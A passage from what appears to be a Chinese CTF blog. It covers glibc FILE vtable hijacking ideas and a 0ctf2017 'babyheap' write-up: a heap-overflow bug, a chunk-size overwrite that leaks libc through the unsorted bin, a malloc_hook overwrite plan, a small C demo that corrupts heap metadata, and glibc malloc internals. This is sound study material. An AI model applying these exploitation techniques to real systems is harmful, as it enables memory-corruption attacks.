<span class="token number">27</span>    <span class="token function">__printf</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token number">28</span>    <span class="token punctuation">{</span>
<span class="token number">29</span>      va_list arg<span class="token punctuation">;</span>
<span class="token number">30</span>      <span class="token keyword">int</span> done<span class="token punctuation">;</span>
<span class="token number">31</span>    
<span class="token number">32</span>      <span class="token function">va_start</span> <span class="token punctuation">(</span>arg<span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">33</span>      done <span class="token operator">=</span> <span class="token function">vfprintf</span> <span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> format<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">34</span>      <span class="token function">va_end</span> <span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">35</span>    
<span class="token number">36</span>      <span class="token keyword">return</span> done<span class="token punctuation">;</span>
<span class="token number">37</span>    <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在关于<code>_IO_FILE</code>的资料里说到…<br>printf, puts会调用到vtable里的<code>_IO_sputn</code>, 在gdb里观察一下</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ p <span class="token operator">*</span>_IO_list_all
$<span class="token number">3</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  file <span class="token operator">=</span> <span class="token punctuation">{</span>
    _flags <span class="token operator">=</span> <span class="token number">0xfbad2087</span><span class="token punctuation">,</span> 
    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_read_end <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_read_base <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_write_base <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_write_end <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_buf_base <span class="token operator">=</span> <span class="token number">0xf7f97d07</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _IO_buf_end <span class="token operator">=</span> <span class="token number">0xf7f97d08</span> <span class="token operator">&lt;</span>_IO_2_1_stderr_<span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span>
    _IO_save_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _IO_backup_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _IO_save_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _markers <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _chain <span class="token operator">=</span> <span class="token number">0xf7f97d60</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">></span><span class="token punctuation">,</span> 
    _fileno <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">,</span> 
    _flags2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _old_offset <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> 
    _cur_column <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _vtable_offset <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _shortbuf <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> 
    _lock <span class="token operator">=</span> <span class="token number">0xf7f98864</span> <span class="token operator">&lt;</span>_IO_stdfile_2_lock<span class="token operator">></span><span class="token punctuation">,</span> 
    _offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
    _codecvt <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _wide_data <span class="token operator">=</span> <span class="token number">0xf7f97420</span> <span class="token operator">&lt;</span>_IO_wide_data_2<span class="token operator">></span><span class="token punctuation">,</span> 
    _freeres_list <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _freeres_buf <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    __pad5 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _mode <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
    _unused2 <span class="token operator">=</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">39</span> times<span class="token operator">></span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> 
  vtable <span class="token operator">=</span> <span class="token number">0xf7f96ac0</span> <span class="token operator">&lt;</span>_IO_file_jumps<span class="token operator">></span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>系统中打开的文件都是一个叫做<code>_IO_FILE_plus</code>的结构体</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE_plus<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>而<code>_IO_FILE</code>结构体中的<code>_chain</code>, 把系统中的文件给链接起来</p>
<p>而这个链表头在<code>_IO_list_all</code>. 比如系统中打开一个文件file1, 那就是</p>
<pre><code>_IO_list_all -&gt; file1 -&gt; stderr -&gt; stdout -&gt; stdin
</code></pre><p>我们看一下, 我这里vatble有啥</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ p <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> _IO_FILE_plus<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_IO_list_all<span class="token punctuation">.</span>file<span class="token punctuation">.</span>_chain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>vtable 
$<span class="token number">11</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  __dummy <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  __dummy2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  __finish <span class="token operator">=</span> <span class="token number">0xf7e4e980</span> <span class="token operator">&lt;</span>_IO_new_file_finish<span class="token operator">></span><span class="token punctuation">,</span> 
  __overflow <span class="token operator">=</span> <span class="token number">0xf7e4f3a0</span> <span class="token operator">&lt;</span>_IO_new_file_overflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __underflow <span class="token operator">=</span> <span class="token number">0xf7e4f140</span> <span class="token operator">&lt;</span>_IO_new_file_underflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __uflow <span class="token operator">=</span> <span class="token number">0xf7e50220</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __pbackfail <span class="token operator">=</span> <span class="token number">0xf7e510b0</span> <span class="token operator">&lt;</span>__GI__IO_default_pbackfail<span class="token operator">></span><span class="token punctuation">,</span> 
<span class="token operator">=</span><span class="token operator">></span>  __xsputn <span class="token operator">=</span> <span class="token number">0xf7e4e5f0</span> <span class="token operator">&lt;</span>_IO_new_file_xsputn<span class="token operator">></span><span class="token punctuation">,</span>  
  __xsgetn <span class="token operator">=</span> <span class="token number">0xf7e4e200</span> <span class="token operator">&lt;</span>__GI__IO_file_xsgetn<span class="token operator">></span><span class="token punctuation">,</span> 
  __seekoff <span class="token operator">=</span> <span class="token number">0xf7e4d4a0</span> <span class="token operator">&lt;</span>_IO_new_file_seekoff<span class="token operator">></span><span class="token punctuation">,</span> 
  __seekpos <span class="token operator">=</span> <span class="token number">0xf7e504c0</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span> 
  __setbuf <span class="token operator">=</span> <span class="token number">0xf7e4d2e0</span> <span class="token operator">&lt;</span>_IO_new_file_setbuf<span class="token operator">></span><span class="token punctuation">,</span> 
  __sync <span class="token operator">=</span> <span class="token number">0xf7e4d1d0</span> <span class="token operator">&lt;</span>_IO_new_file_sync<span class="token operator">></span><span class="token punctuation">,</span> 
  __doallocate <span class="token operator">=</span> <span class="token number">0xf7e428c0</span> <span class="token operator">&lt;</span>__GI__IO_file_doallocate<span class="token operator">></span><span class="token punctuation">,</span> 
  __read <span class="token operator">=</span> <span class="token number">0xf7e4e5a0</span> <span class="token operator">&lt;</span>__GI__IO_file_read<span class="token operator">></span><span class="token punctuation">,</span> 
  __write <span class="token operator">=</span> <span class="token number">0xf7e4e050</span> <span class="token operator">&lt;</span>_IO_new_file_write<span class="token operator">></span><span class="token punctuation">,</span> 
  __seek <span class="token operator">=</span> <span class="token number">0xf7e4dd90</span> <span class="token operator">&lt;</span>__GI__IO_file_seek<span class="token operator">></span><span class="token punctuation">,</span> 
  __close <span class="token operator">=</span> <span class="token number">0xf7e4d2b0</span> <span class="token operator">&lt;</span>__GI__IO_file_close<span class="token operator">></span><span class="token punctuation">,</span> 
  __stat <span class="token operator">=</span> <span class="token number">0xf7e4e030</span> <span class="token operator">&lt;</span>__GI__IO_file_stat<span class="token operator">></span><span class="token punctuation">,</span> 
  __showmanyc <span class="token operator">=</span> <span class="token number">0xf7e51240</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span> 
  __imbue <span class="token operator">=</span> <span class="token number">0xf7e51250</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第八个的这个__xsputn就是printf, puts, fwrite之类写函数会用到的</p>
<p>如果能改写这个指针…</p>
<p>等一下…我们在<code>_IO_FILE</code>的定义中…有一个<code>const</code>…那<code>vatble</code>的内容真的可以改吗…? 不能吧…但应该能伪造一个vtable.然后改变<code>stdout</code>中<code>vatble</code>指向我们的<code>fake_vtable</code>…</p>
<p>这题难道还能构造一个vatble不成…?</p>
<p>查了一下…这个<code>const</code>好像是<code>glibc-2.23</code>加入的…而我刚好就是<code>2.23</code>, 好叭</p>
<p>可能比赛时候环境里libc版本比较低, 可以直接更改<code>stdout</code>的<code>vtable</code>里的<code>__xsputn</code>到<code>one_gadget</code>…?</p>
<p>算了, 先睡觉…明天再找找wp</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf2017 | babyheap]]></title>
      <url>/2018/07/06/0ctf2017-babyheap/</url>
      <content type="html"><![CDATA[<p>题目一上来…<code>sub_B70</code>函数里一顿操作, 吓傻了</p>
<p>忘了checksec…好吧..保护全开, 这很baby</p>
<p>主要功能</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> Allocate
<span class="token number">2</span><span class="token punctuation">.</span> Fill
<span class="token number">3</span><span class="token punctuation">.</span> Free
<span class="token number">4</span><span class="token punctuation">.</span> Dump
<span class="token number">5</span><span class="token punctuation">.</span> Exit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外…写 IDA的结构体的时候64bit整数不要写int…要用long</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> bheap<span class="token punctuation">{</span>
    <span class="token keyword">long</span> inuse<span class="token punctuation">;</span>
    <span class="token keyword">long</span> size<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而且, 看汇编能看到, 是<code>sub_B70</code>函数的返回值应该是个函数指针, 然后这个值作为了<code>Allocate</code>, <code>Fill</code>, <code>Free</code>, <code>Dump</code>的参数…但由于main里到这些功能函数是用了跳转表的形式, 所以这里从ida的反汇编结果里看不到<code>sub_B70</code>返回值的赋值和传参…</p>
<p>很容易就发现一个洞. 就是Allocate的时候会设置一个<code>size</code>, 而在Fill的时候, 会让你新输入一个size, 来作为fill的content的大小, 而且不会比较新的size和原来size…这样就可以任意堆溢出了</p>
<p>但貌似…Fill的时候, 不会更新size字段, 所以, 额, 在Dump的时候还是只能dump出来我们最初设定的size大小的内容</p>
<p>Free的时候貌似没有什么洞, 会把inuse位置为0, size置为0, free掉ptr, 之后在Allocate的时候, 可以在free掉的地方建立新的块</p>
<p>诶…没有UAF的洞, 而且内存分配用的是calloc, 会对内存进行清空,貌似leak稍有困难…</p>
<p>已经可以随意堆溢出了, 所以leak出地址, 改写malloc_hook就OK了吧<br>leak地址应该使用smallbin<br>更改malloc_hook用fastbin比较简单</p>
<p>所以怎么leak呢…</p>
<p>我们要用一个smallbin, 然后free掉他, 他会进入到unsorted bin, 然后这个时候…我们没有UAF, 就很尴尬</p>
<p>找了一下WP, …因为没有UAF而要leak地址的艰辛….真是</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/#2017-0ctf-babyheap" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/#2017-0ctf-babyheap</a></p>
<p>通过更改smallbin这一块的size, 和某free掉的chunk的fd指针, 使得, 这块smallbin放到了fastbinY里</p>
<p>然后通过两次fastbin大小的请求, 把这块smallbin再申请出来, 再把size改回去, 好让他释放后放到unsorted bin</p>
<p>这一波神奇的操作就是为了让俩块bheap都持有这块smallbin的指针…</p>
<p>使得我们能够释放一个bheap, 把smallbin放入了unsorted bin, 的同时, 用另一块持有这块堆块指针的bheap能够使用dump来leak出来地址</p>
<blockquote>
<p>update 2019-3-11<br>当时感觉上面说的方法很…奇特…今天发现一个dalao的blog里写的感觉很棒..一种不同的方法<br>dalao的blog链接: <a href="http://www.pwndog.top/2018/09/11/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%85%AD%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/" target="_blank" rel="external">http://www.pwndog.top/2018/09/11/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%85%AD%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</a></p>
</blockquote>
<p>对于三个块进行操作, </p>
<pre><code>...
malloc(0x60)
malloc(0x60)
malloc(0x60)
...
</code></pre><p>对应的内存分布图</p>
<pre><code>-------------
chunk2 0x71
-------------
chunk3 0x71
-------------
chunk4 0x71
-------------
</code></pre><p>然后fill这个chunk2..溢出使得chunk3的size发生变化</p>
<pre><code>-------------
chunk2 0x71
-------------
chunk3 0xe1 (0x70 * 2 + 1)
-------------
chunk4 0x71
-------------
</code></pre><p>然后free掉chunk3…因为0xe1大小已经属于fastbin了…所以free掉的时候会放进unsorted bin</p>
<p>然后再进行malloc…这里就是神奇的地方…由于fastbin里没找到合适的, 但unsorted bin里有一块大小0xe0的块, 就会把他切分, 把靠前的0x70字节(原来chunk3位置的块)返回作为这次malloc的分配的块, 然后接下来的0x70(由于我们溢出改了size,才让系统认为我们free掉了一个0xe0的块,所以靠后的这0x70其实是原来的chunk4的位置)就被放回到unsorted bin里继续候着…<br>所以这个时候就出现了</p>
<pre><code>0x558d9949e0e0: 0x0000000000000000  0x0000000000000071 -&gt; chunk2
0x558d9949e0f0: 0x6161616161616161  0x6161616161616161
0x558d9949e100: 0x6161616161616161  0x6161616161616161
0x558d9949e110: 0x6161616161616161  0x6161616161616161
0x558d9949e120: 0x6161616161616161  0x6161616161616161
0x558d9949e130: 0x6161616161616161  0x6161616161616161
0x558d9949e140: 0x6161616161616161  0x6161616161616161
0x558d9949e150: 0x0000000000000000  0x0000000000000071 -&gt; chunk3, 刚malloc回来
0x558d9949e160: 0x0000000000000000  0x0000000000000000
0x558d9949e170: 0x0000000000000000  0x0000000000000000
0x558d9949e180: 0x0000000000000000  0x0000000000000000
0x558d9949e190: 0x0000000000000000  0x0000000000000000
0x558d9949e1a0: 0x0000000000000000  0x0000000000000000
0x558d9949e1b0: 0x0000000000000000  0x0000000000000000
0x558d9949e1c0: 0x0000000000000000  0x0000000000000071 -&gt; 切剩下放回unsorted bin
0x558d9949e1d0: 0x00007ff6212b8b78  0x00007ff6212b8b78
0x558d9949e1e0: 0x0000000000000000  0x0000000000000000
</code></pre><p>这个时候由于chunk4切剩下放回了unsorted bin, 就使的现在show 一下chunk4就能得到libc</p>
<p>dalao tql, 我们做的就是写chunk2溢出修改到chunk3的size, 然后free掉chunk3, show chunk4</p>
<p>但…不知道我理解的对不对…因为之前一直因为, 这个切一部分unsorted bin的操作是只有没找到合适的smallbin才切…没发现…这tm也能切…没找到合适的fastbin也能切???</p>
<p>所以准备在free之后..在malloc的地方打断点,调试的学习一下</p>
<p>woc…我的这个源码好像对不上…醉了, 明明都是2.23</p>
<p>只能依稀的观察到这个0xe0的块开始在 bins0 …. 然后 到了…bins26…然后他…好像就被切了..之后的0x70又在bins0里</p>
<p>在这个中有提到 <a href="http://brieflyx.me/2016/heap/glibc-heap/" target="_blank" rel="external">http://brieflyx.me/2016/heap/glibc-heap/</a></p>
<p>这个应该是前面的fastbinY和smallbin都没有找到合适的,所以开始处理unsorted的块</p>
<p>迭代过程中,找到大小正好的就返回, 不然的话, 就把这个块放到对应的small bin或者large bin里<br>等到unsorted里没有块l<br>然后在small bins和large bins里找到满足需求的最小块, 然后切分, 前一块给用户, 后面一块放到unsorted bin里</p>
<p>好了,学到了….我去再仔细看看源代码</p>
<p>调试一下可以发现, 我们free掉chunk3的时候, unsorted bin里的0xe0这块不叫last_reminder, 而之后切剩下这块叫做last_reminder<br>(p main_arena 能看到这个结构)</p>
<p>看一下last_reminder定义是…<br>/<em> The remainder from the most recent split of a small request </em>/<br>那….为什么我的一个split of a fast request也叫….last_reminder</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> ck2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> ck3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span> ck4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> l <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ck2<span class="token punctuation">;</span>
    l<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
    l<span class="token punctuation">[</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xe1</span><span class="token punctuation">;</span>

    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ck3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>验证一下…</p>
<pre><code>gdb-peda$ heap all
Top Chunk:  0x602560
Last Remainder:  0x6020e0
0x602000 SIZE=0x70 DATA[0x602010] |................................| INUSED PREV_INUSE
0x602070 SIZE=0x70 DATA[0x602080] |H.......H.......................| INUSED PREV_INUSE
0x6020e0 SIZE=0x70 DATA[0x6020f0] |x.......x.......................| PREV_INUSE INUSED
0x602150 SIZE=0x410 DATA[0x602160] |................................| INUSED
0x602560 SIZE=0x20aa0 TOP_CHUNK
</code></pre><p>看来我一直对这个last_reminder有误解</p>
<p>喔,不是,原来是我对这个 smallbin理解有误…fastbin大小是包含在了smallbin大小里, 好吧, 我好菜啊</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> in_smallbin_range(sz)                                                  \
    ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>明天再继续仔细看一看</p>
<p>仔细的阅读了一下<br>‘_int_malloc’会<br>先精准的匹配fastbin<br>然后精准匹配smallbin<br>然后..<del>还没匹配到的话</del>, 如果是large的请求, 就把fastbin合并丢到unsorted bin里了, 就是传说中的<code>malloc_consolidate</code></p>
<p>这里的说明就是他代码是 </p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hava_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就算是请求smallbin, 但没有匹配到, 也不会进行malloc_consolidate, 我之前理解错了</p>
<p>之后就是一个大循环<br>进入大循环 <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/core_functions.html" target="_blank" rel="external">说明</a></p>
<ol>
<li>Size falls into ‘fastbin’ range but no fastchunk is available.</li>
<li>Size falls into ‘smallbin’ range but no smallchunk is available (calls malloc_consolidate during initialization).</li>
<li>Size falls into ‘largbin’ range.<br>(而不是某些文章分析说的, 进入大循环说明就是一定要分配large bin了</li>
</ol>
<p>大循环(有点复杂….)…不过这个大循环怎么结束呢, 没有强制最多多少次?</p>
<pre><code>1. 小循环, 会反向的遍历unsorted bin...最多1w次
    - 先对当前块检查大小是不是符合规矩, 不然就报个错
    - 如果当前块大小符合smallbin 并且 是last_reminder 并且 unsorted里就这一个块 并且 大小够: 就把这块给切分, 前一块返回给用户, 后一块做为新的last_reminder
    &gt; 那么我有个问题就是, last_reminder是从last_reminder切出来得到的, 那最开始的那一块last_reminder从何而来, 通过搜索...`av-&gt;last_remainder =`, 我找到了另一处赋值, 在小循环之外
    - 如果不满足上述, 那么就把当前块放回对应的smallbin或者largebin里, 这个就是题目中看到的unsorted先回到了smallbin的地方
2. 寻找largebin
3. 到了这里说明...不能精准匹配了, 尝试找一块更大的块切开, 我们题目exp里切切开就是在这个地方..., 产生了最初的last_reminder, 切完之后, 剩下的部分好像是属于smallbin, 才给last_reminder赋值 
</code></pre><pre class="line-numbers language-c"><code class="language-c">
  <span class="token comment" spellcheck="true">/* advertise as last remainder */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>
    av<span class="token operator">-></span>last_remainder <span class="token operator">=</span> remainder<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>4. 到了这里就要用top了...
5. ~~再次合并fastbin, 就是malloc_consolidate...~~ 这里有点问题 ... 并不是要用top就malloc_consolidate
6. 用sysmalloc
</code></pre><p>4.5.6 这里的逻辑是</p>
<pre class="line-numbers language-c"><code class="language-c">use_top<span class="token punctuation">:</span>
victim <span class="token operator">=</span> av <span class="token operator">-></span> top<span class="token punctuation">;</span>
size <span class="token operator">=</span> <span class="token function">chunsize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// top大小够用...使用top</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hava_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// top大小不够...才malloc_consolidate</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 使用sysmalloc....</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说…其实吧, 这里出现的malloc_consolidate的几率也比较小…<br>所以大概认为malloc_consolidate基本只会粗线在largebin的申请中</p>
<p><del>我有个问题, 在这里最后都用sysmalloc了….肯定就结束了, 那这个大循环有什么意义呢, 大循环这里代码大概是</del> 问题解决</p>
